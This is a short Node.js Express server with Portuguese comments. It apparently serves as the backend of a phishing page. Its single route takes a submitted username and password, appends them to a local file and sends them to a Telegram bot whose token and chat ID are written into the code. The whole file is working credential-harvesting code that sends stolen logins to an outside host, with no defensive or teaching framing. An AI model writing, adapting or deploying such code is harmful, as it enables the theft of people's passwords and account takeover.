const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/dados', (req, res) => {
  const { usuario, senha } = req.body;
  const mensagem = `Usuário: ${usuario}\nSenha: ${senha}\n\n`;

  // Salva no arquivo
  fs.appendFileSync('./save/dados.txt', mensagem);

  // Envia pro Telegram
  const token = '7333858492:AAFNcTINex5X69tZOWi18TTsUPiBBVt81jI';
  const chatId = '8129097592';
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensagem)}`;

  https.get(url, (resp) => {
    res.redirect('/');
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});